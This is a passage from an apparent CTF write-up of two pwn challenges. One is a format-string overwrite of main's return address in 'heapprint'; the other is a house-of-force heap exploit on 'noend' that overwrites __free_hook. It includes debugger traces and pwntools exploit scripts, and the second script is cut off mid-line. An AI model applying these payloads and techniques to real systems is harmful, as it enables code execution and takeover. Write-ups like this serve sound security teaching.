<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload="%55928d%9$hn", 55928=0xda78</span></span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">=&gt; 0x555555554a96:	call   0x555555554838</span><br><span class="line">   0x555555554a9b:	lea    rdi,[rip+0xb6]        <span class="comment"># 0x555555554b58</span></span><br><span class="line">   0x555555554aa2:	call   0x555555554820</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x555555755060 --&gt; 0x0 </span><br><span class="line">arg[1]: 0x100 </span><br><span class="line">arg[2]: 0x555555756010 (<span class="string">"%55928d%9<span class="variable">$hn</span>\n"</span>)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffda60 --&gt; 0x0 </span><br><span class="line">0008| 0x7fffffffda68 --&gt; 0x8879fe5d03add800 </span><br><span class="line">0016| 0x7fffffffda70 --&gt; 0x555555554ad0 (push   r15)</span><br><span class="line">0024| 0x7fffffffda78 --&gt; 0x2aaaaacf3830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">0032| 0x7fffffffda80 --&gt; 0x1 </span><br><span class="line">0040| 0x7fffffffda88 --&gt; 0x7fffffffdb58 --&gt; 0x7fffffffdf44 (<span class="string">"./heapprint"</span>)</span><br><span class="line">......</span><br><span class="line">0240| 0x7fffffffdb50 --&gt; 0x1 </span><br><span class="line">0248| 0x7fffffffdb58 --&gt; 0x7fffffffdf44 (<span class="string">"./heapprint"</span>)</span><br><span class="line"></span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x555555554a8a:	lea    rdi,[rip+0x2005cf]        <span class="comment"># 0x555555755060</span></span><br><span class="line">   0x555555554a91:	mov    eax,0x0</span><br><span class="line">   0x555555554a96:	call   0x555555554838</span><br><span class="line">=&gt; 0x555555554a9b:	lea    rdi,[rip+0xb6]        <span class="comment"># 0x555555554b58</span></span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffda60 --&gt; 0x0 </span><br><span class="line">0008| 0x7fffffffda68 --&gt; 0x8879fe5d03add800 </span><br><span class="line">0016| 0x7fffffffda70 --&gt; 0x555555554ad0 (push   r15)</span><br><span class="line">0024| 0x7fffffffda78 --&gt; 0x2aaaaacf3830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">0032| 0x7fffffffda80 --&gt; 0x1 </span><br><span class="line">0040| 0x7fffffffda88 --&gt; 0x7fffffffdb58 --&gt; 0x7fffffffda78 --&gt; 0x2aaaaacf3830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">......</span><br><span class="line">0240| 0x7fffffffdb50 --&gt; 0x1 </span><br><span class="line">0248| 0x7fffffffdb58 --&gt; 0x7fffffffda78 --&gt; 0x2aaaaacf3830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br></pre></td></tr></table></figure>
<p>Seems working!</p>
<p>Now modify the return address.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload="%55928d%9$hn%35$n", 55928=0xda78</span></span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">=&gt; 0x555555554a96:	call   0x555555554838</span><br><span class="line">   0x555555554a9b:	lea    rdi,[rip+0xb6]        <span class="comment"># 0x555555554b58</span></span><br><span class="line">   0x555555554aa2:	call   0x555555554820</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x555555755060 --&gt; 0x0 </span><br><span class="line">arg[1]: 0x100 </span><br><span class="line">arg[2]: 0x555555756010 (<span class="string">"%55928d%9<span class="variable">$hn</span>%35<span class="variable">$n</span>\n"</span>)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffda60 --&gt; 0x0 </span><br><span class="line">0008| 0x7fffffffda68 --&gt; 0x8879fe5d03add800 </span><br><span class="line">0016| 0x7fffffffda70 --&gt; 0x555555554ad0 (push   r15)</span><br><span class="line">0024| 0x7fffffffda78 --&gt; 0x2aaaaacf3830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">0032| 0x7fffffffda80 --&gt; 0x1 </span><br><span class="line">0040| 0x7fffffffda88 --&gt; 0x7fffffffdb58 --&gt; 0x7fffffffdf44 (<span class="string">"./heapprint"</span>)</span><br><span class="line">......</span><br><span class="line">0240| 0x7fffffffdb50 --&gt; 0x1 </span><br><span class="line">0248| 0x7fffffffdb58 --&gt; 0x7fffffffdf44 (<span class="string">"./heapprint"</span>)</span><br><span class="line"></span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x555555554a8a:	lea    rdi,[rip+0x2005cf]        <span class="comment"># 0x555555755060</span></span><br><span class="line">   0x555555554a91:	mov    eax,0x0</span><br><span class="line">   0x555555554a96:	call   0x555555554838</span><br><span class="line">=&gt; 0x555555554a9b:	lea    rdi,[rip+0xb6]        <span class="comment"># 0x555555554b58</span></span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffda60 --&gt; 0x0 </span><br><span class="line">0008| 0x7fffffffda68 --&gt; 0x8879fe5d03add800 </span><br><span class="line">0016| 0x7fffffffda70 --&gt; 0x555555554ad0 (push   r15)</span><br><span class="line">0024| 0x7fffffffda78 --&gt; 0x2aaaaacf3830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">0032| 0x7fffffffda80 --&gt; 0x1 </span><br><span class="line">0040| 0x7fffffffda88 --&gt; 0x7fffffffdb58 --&gt; 0x7fffffffda78 --&gt; 0x2aaaaacf3830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">......</span><br><span class="line">0240| 0x7fffffffdb50 --&gt; 0x1 </span><br><span class="line">0248| 0x7fffffffdb58 --&gt; 0x7fffffffda78 --&gt; 0x2aaaaacf3830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line"></span><br><span class="line">gdb-peda$ telescope 0x7fffffffdf44</span><br><span class="line">0000| 0x7fffffffdf44 --&gt; 0x727070610000da78 </span><br><span class="line">0008| 0x7fffffffdf4c --&gt; 0x4956594d00746e69 (<span class="string">'int'</span>)</span><br></pre></td></tr></table></figure>
<p>?? The return address is still the same,but content at <code>0x7fffffffdf44</code> has been changed! It seems that when the snprintf process <code>%35$n</code>, it still uses the old value <code>0x7fffffffdf44</code> but not the new value <code>0x7fffffffda78</code>.</p>
<p>So what do we do now? Well, you can read the source of glibc, or you can try the following payload.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload="%c%c%c%c%c%c%c%55921d%hn%35$n", 55928=0xda78</span></span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">=&gt; 0x555555554a96:	call   0x555555554838</span><br><span class="line">   0x555555554a9b:	lea    rdi,[rip+0xb6]        <span class="comment"># 0x555555554b58</span></span><br><span class="line">   0x555555554aa2:	call   0x555555554820</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x555555755060 --&gt; 0x0 </span><br><span class="line">arg[1]: 0x100 </span><br><span class="line">arg[2]: 0x555555756010 (<span class="string">"%c%c%c%c%c%c%c%55921d%hn%35<span class="variable">$n</span>\n"</span>)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffda60 --&gt; 0x0 </span><br><span class="line">0008| 0x7fffffffda68 --&gt; 0x8879fe5d03add800 </span><br><span class="line">0016| 0x7fffffffda70 --&gt; 0x555555554ad0 (push   r15)</span><br><span class="line">0024| 0x7fffffffda78 --&gt; 0x2aaaaacf3830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">0032| 0x7fffffffda80 --&gt; 0x1 </span><br><span class="line">0040| 0x7fffffffda88 --&gt; 0x7fffffffdb58 --&gt; 0x7fffffffdf44 (<span class="string">"./heapprint"</span>)</span><br><span class="line">......</span><br><span class="line">0240| 0x7fffffffdb50 --&gt; 0x1 </span><br><span class="line">0248| 0x7fffffffdb58 --&gt; 0x7fffffffdf44 (<span class="string">"./heapprint"</span>)</span><br><span class="line"></span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x555555554a8a:	lea    rdi,[rip+0x2005cf]        <span class="comment"># 0x555555755060</span></span><br><span class="line">   0x555555554a91:	mov    eax,0x0</span><br><span class="line">   0x555555554a96:	call   0x555555554838</span><br><span class="line">=&gt; 0x555555554a9b:	lea    rdi,[rip+0xb6]        <span class="comment"># 0x555555554b58</span></span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffda60 --&gt; 0x0 </span><br><span class="line">0008| 0x7fffffffda68 --&gt; 0x68a91f9995c84b00 </span><br><span class="line">0016| 0x7fffffffda70 --&gt; 0x555555554ad0 (push   r15)</span><br><span class="line">0024| 0x7fffffffda78 --&gt; 0x2aaa0000da78 </span><br><span class="line">0032| 0x7fffffffda80 --&gt; 0x1 </span><br><span class="line">0040| 0x7fffffffda88 --&gt; 0x7fffffffdb58 --&gt; 0x7fffffffda78 --&gt; 0x2aaa0000da78 </span><br><span class="line"></span><br><span class="line">0240| 0x7fffffffdb50 --&gt; 0x1 </span><br><span class="line">0248| 0x7fffffffdb58 --&gt; 0x7fffffffda78 --&gt; 0x2aaa0000da78 </span><br><span class="line"></span><br><span class="line">gdb-peda$ telescope 0x7fffffffdf44</span><br><span class="line">0000| 0x7fffffffdf44 (<span class="string">"./heapprint"</span>)</span><br><span class="line">0008| 0x7fffffffdf4c --&gt; 0x4956594d00746e69 (<span class="string">'int'</span>)</span><br></pre></td></tr></table></figure>
<p>Wow, we successfully changed the return value of main!!! It seems that when snprintf processes the format with <code>$</code> and those without <code>$</code> independently. If you want more details, RTFSC.</p>
<p>But we don’t know the address of libc, so if we want to change the return address to be one gadget, we need to brute force 12 bit, plus 4 bit to guess the stack ,we have to brute force 16 bits!</p>
<p>Luckily, we don’t need to. In format-string processing, we have a special symbol <code>*</code>. What’s its usage? Ask google.</p>
<p>With all these combined, we can get shell by bruteforce 5 bits, which is totally acceptable.</p>
<h4 id="The-Final-Script"><a href="#The-Final-Script" class="headerlink" title="The Final Script"></a>The Final Script</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">remote_addr=<span class="string">"pwn.suctf.asuri.org"</span></span><br><span class="line">remote_port=<span class="number">20000</span></span><br><span class="line"></span><br><span class="line">p=remote(remote_addr,remote_port)</span><br><span class="line"></span><br><span class="line">offset=int(p.recvline().strip(<span class="string">'\n'</span>))</span><br><span class="line">offset=(offset&lt;&lt;<span class="number">8</span>)+<span class="number">0x18</span></span><br><span class="line">offset2=<span class="number">0xd0917</span></span><br><span class="line">payload=<span class="string">'%c'</span>*<span class="number">7</span>+<span class="string">'%'</span>+str(offset-arg)+<span class="string">'d%hn'</span>+<span class="string">'%c'</span>*<span class="number">23</span>+<span class="string">'%'</span>+str(offset2-offset<span class="number">-23</span>)+<span class="string">'d%*7$d%n'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Noend"><a href="#Noend" class="headerlink" title="Noend"></a>Noend</h3><p>This is a heap challenge. When I was playing the heap one day, I found that if you malloc a extremely large size that ptmalloc can’t handle, it would alloc and use another arena afterward. And this is where the challenge comes from.</p>
<h4 id="Program-info-1"><a href="#Program-info-1" class="headerlink" title="Program info"></a>Program info</h4><p>Let’s take a look in the program</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">'/home/ne0/Desktop/suctf/noend/noend'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>and the main logic of the program is</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* s;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>  len;</span><br><span class="line">Init();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x20</span>);</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x20</span><span class="number">-1</span>);</span><br><span class="line">    len=strtoll(buf,<span class="literal">NULL</span>,<span class="number">10</span>);</span><br><span class="line">    s=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    read(<span class="number">0</span>,s,len);</span><br><span class="line">    s[len<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">    write(<span class="number">1</span>,s,len&amp;<span class="number">0xFFFF</span>);</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">"\n"</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(len&lt;<span class="number">0x80</span>)</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>You can endless alloc a chunk with arbitrary size, but after you write something into it ,it gets freed if its size is less than 0x80. So most of the heap pwning techniques don’t work here as you can have only one chunk allocated.</p>
<h4 id="Bug-1"><a href="#Bug-1" class="headerlink" title="Bug"></a>Bug</h4><p>Seems no bug at the first glance. But take a deeper look at the following code.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">read(<span class="number">0</span>,s,len);</span><br><span class="line">s[len<span class="number">-1</span>]=<span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>It doesn’t check the status of malloc. If the malloc fails due to some reason, <code>s[len-1]=0</code> is equal to <code>*(char*)(len-1)=0</code>, which means we can write a <code>\x00</code> to almost arbitrary address.</p>
<h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><p>The leak is easy, and I will skip that part.</p>
<p>Suppose now we have the address of libc <code>libc_base</code> and heap <code>heap_base</code>, what do we do next?</p>
<p>The first idea that comes to me is <code>house of force</code> — by partial overwrite a <code>\x00</code> to the top chunk ptr. But after we do that ,we find that the main arena seems not working anymore..</p>
<p>Here’s a useful POC:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Before:\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,<span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Mallco failed:%p\n"</span>,<span class="built_in">malloc</span>(<span class="number">-1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"After:\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,<span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Before:</span><br><span class="line">0xee7420</span><br><span class="line">Mallco failed:(nil)</span><br><span class="line">After:</span><br><span class="line">0x7fb7b00008c0</span><br></pre></td></tr></table></figure>
<p>The pointer malloc returns is <code>0x7fb7b00008c0</code> ??!</p>
<p>You can read the source of glibc for more details. In a word, when you malloc a size that the main arena can’t handle, malloc will try to use another arena. And later allocations will all be handled by the arena. The insteresting part is that, after you switch the arena, if you malloc a extremely big size again, the arena will not change anymore! That means we can partial overwrite the top chunk pointer of this arena and use <code>house of force</code>!</p>
<p>A little debugging after leak the address of another arena (in this case <code>0x7f167c000020</code>)<br>Almost same as main arena</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ telescope 0x7f167c000020 100</span><br><span class="line">0000| 0x7f167c000020 --&gt; 0x200000000 </span><br><span class="line">0008| 0x7f167c000028 --&gt; 0x0 </span><br><span class="line">0016| 0x7f167c000030 --&gt; 0x0 </span><br><span class="line">0024| 0x7f167c000038 --&gt; 0x0 </span><br><span class="line">0032| 0x7f167c000040 --&gt; 0x0 </span><br><span class="line">0040| 0x7f167c000048 --&gt; 0x0 </span><br><span class="line">0048| 0x7f167c000050 --&gt; 0x7f167c0008b0 --&gt; 0x0 </span><br><span class="line">0056| 0x7f167c000058 --&gt; 0x0 </span><br><span class="line">0064| 0x7f167c000060 --&gt; 0x0 </span><br><span class="line">0072| 0x7f167c000068 --&gt; 0x0 </span><br><span class="line">0080| 0x7f167c000070 --&gt; 0x0 </span><br><span class="line">0088| 0x7f167c000078 --&gt; 0x7f167c000920 --&gt; 0x0 </span><br><span class="line">0096| 0x7f167c000080 --&gt; 0x0 </span><br><span class="line">0104| 0x7f167c000088 --&gt; 0x7f167c000078 --&gt; 0x7f167c000920 --&gt; 0x0 </span><br><span class="line">0112| 0x7f167c000090 --&gt; 0x7f167c000078 --&gt; 0x7f167c000920 --&gt; 0x0 </span><br><span class="line">0120| 0x7f167c000098 --&gt; 0x7f167c000088 --&gt; 0x7f167c000078 --&gt; 0x7f167c000920 --&gt; 0x0 </span><br><span class="line">0128| 0x7f167c0000a0 --&gt; 0x7f167c000088 --&gt; 0x7f167c000078 --&gt; 0x7f167c000920 --&gt; 0x0 </span><br><span class="line">..............</span><br></pre></td></tr></table></figure>
<p>Write the top chunk pointer</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ telescope 0x7f167c000020 100</span><br><span class="line">0000| 0x7f167c000020 --&gt; 0x200000000 </span><br><span class="line">0008| 0x7f167c000028 --&gt; 0x7f167c0008b0 --&gt; 0x0 </span><br><span class="line">0016| 0x7f167c000030 --&gt; 0x0 </span><br><span class="line">0024| 0x7f167c000038 --&gt; 0x0 </span><br><span class="line">0032| 0x7f167c000040 --&gt; 0x0 </span><br><span class="line">0040| 0x7f167c000048 --&gt; 0x0 </span><br><span class="line">0048| 0x7f167c000050 --&gt; 0x0 </span><br><span class="line">0056| 0x7f167c000058 --&gt; 0x0 </span><br><span class="line">0064| 0x7f167c000060 --&gt; 0x0 </span><br><span class="line">0072| 0x7f167c000068 --&gt; 0x0 </span><br><span class="line">0080| 0x7f167c000070 --&gt; 0x0 </span><br><span class="line">0088| 0x7f167c000078 --&gt; 0x7f167c000a00 --&gt; 0x7f168bfa729a </span><br><span class="line">0096| 0x7f167c000080 --&gt; 0x7f167c0008d0 --&gt; 0x0 </span><br><span class="line">0104| 0x7f167c000088 --&gt; 0x7f167c0008d0 --&gt; 0x0 </span><br><span class="line">0112| 0x7f167c000090 --&gt; 0x7f167c0008d0 --&gt; 0x0 </span><br><span class="line">0120| 0x7f167c000098 --&gt; 0x7f167c000088 --&gt; 0x7f167c0008d0 --&gt; 0x0 </span><br><span class="line">0128| 0x7f167c0000a0 --&gt; 0x7f167c000088 --&gt; 0x7f167c0008d0 --&gt; 0x0 </span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">gdb-peda$ telescope 0x7f167c000a00</span><br><span class="line">0000| 0x7f167c000a00 --&gt; 0x7f168bfa729a </span><br><span class="line">0008| 0x7f167c000a08 --&gt; 0x7f168bfa729a </span><br><span class="line">0016| 0x7f167c000a10 --&gt; 0x7f168bfa729a </span><br><span class="line">0024| 0x7f167c000a18 --&gt; 0x7f168bfa729a</span><br></pre></td></tr></table></figure>
<p>You can see that instead of size <code>0xFFFFFFFFFFFFFFF</code>, I fake the size to be <code>0x7f168bfa729a</code>. This is a little confusing? Actually I calculate the size as <code>onegadget+(freehook_addr top_chunk_addr)</code>.<br>This means that if I <code>malloc(freehook_addr-top_chunk_addr)</code>, the size left happens to be <code>onegadget</code> ,and it locates in the address of <code>freehook</code>!This is really hackish. Trigger <code>free</code> and you can get the shell.</p>
<p>Of course you can also write <code>system</code> into <code>freehook</code>.Although actually you can’t write exactly <code>system</code> but <code>system+1</code> into <code>freehook</code>, because the prev inused bit of the top chunk is always set.But it won’t stop you from getting a shell. Try it yourself! </p>
<h4 id="Final-Script"><a href="#Final-Script" class="headerlink" title="Final Script"></a>Final Script</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pc=<span class="string">'./noend'</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p=process(pc,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">gdb.attach(p,<span class="string">'c'</span>)</span><br><span class="line"><span class="comment">#p=remote("pwn.suctf.asuri.org",20002)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(a)</span>:</span></span><br><span class="line">    p.recvuntil(a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sa</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    p.sendafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sla</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    k=p.recvline()</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">()</span>:</span></span><br><span class="line">    echo(<span class="number">0x38</span>,<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">    echo(<span class="number">0x28</span>,<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">    echo(<span class="number">0x48</span>,<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">    echo(<span class="number">0x7f</span>,<span class="string">'A'</span>*<span class="number">8</span>)    </span><br><span class="line">    k=echo(<span class="number">0x28</span>,<span class="string">'A'</span>*<span class="number">8</span>)    </span><br><span class="line">    libcaddr=u64(k[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">    libc.address=libcaddr<span class="number">-0x3c1b58</span></span><br><span class="line">    print(<span class="string">"Libc base--&gt;"</span>+hex(libc.address))</span><br><span class="line">    p.sendline(str(libcaddr<span class="number">-1</span>))</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line">    echo(<span class="number">0x38</span>,<span class="string">'A'</span>*<span class="number">8</span>)    </span><br><span class="line">    p.clean()</span><br><span class="line">    echo(<span class="number">0x68</span>,<span class="string">'A'</span>*<span class="number">8</span>)    </span><br><span class="line">    echo(<span class="number">0x48</span>,<span class="string">'A'</span>*<span 